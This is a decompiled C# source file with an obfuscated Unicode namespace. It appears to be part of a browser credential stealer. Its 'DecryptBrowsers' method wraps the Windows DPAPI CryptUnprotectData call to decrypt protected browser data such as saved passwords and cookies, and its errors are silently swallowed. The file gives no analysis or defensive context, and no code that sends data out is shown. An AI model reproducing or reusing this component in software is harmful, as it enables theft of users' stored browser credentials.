using System;
using System.Runtime.InteropServices;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x0200002C RID: 44
	internal static class Class_32
	{
		// Token: 0x060000B5 RID: 181 RVA: 0x00006600 File Offset: 0x00004800
		public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			Class_32.DataBlob dataBlob = default(Class_32.DataBlob);
			Class_32.DataBlob dataBlob2 = default(Class_32.DataBlob);
			Class_32.DataBlob dataBlob3 = default(Class_32.DataBlob);
			Class_32.CryptprotectPromptstruct cryptprotectPromptstruct = new Class_32.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(Class_32.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (cipherTextBytes == null)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch
				{
				}
				try
				{
					if (entropyBytes == null)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch
				{
				}
				Class_32.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x060000B6 RID: 182
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Class_32.DataBlob pCipherText, ref string pszDescription, ref Class_32.DataBlob pEntropy, IntPtr pReserved, ref Class_32.CryptprotectPromptstruct pPrompt, int dwFlags, ref Class_32.DataBlob pPlainText);

		// Token: 0x0200002D RID: 45
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x04000072 RID: 114
			public int cbData;

			// Token: 0x04000073 RID: 115
			public IntPtr pbData;
		}

		// Token: 0x0200002E RID: 46
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x04000074 RID: 116
			public int cbSize;

			// Token: 0x04000075 RID: 117
			public int dwPromptFlags;

			// Token: 0x04000076 RID: 118
			public IntPtr hwndApp;

			// Token: 0x04000077 RID: 119
			public string szPrompt;
		}
	}
}
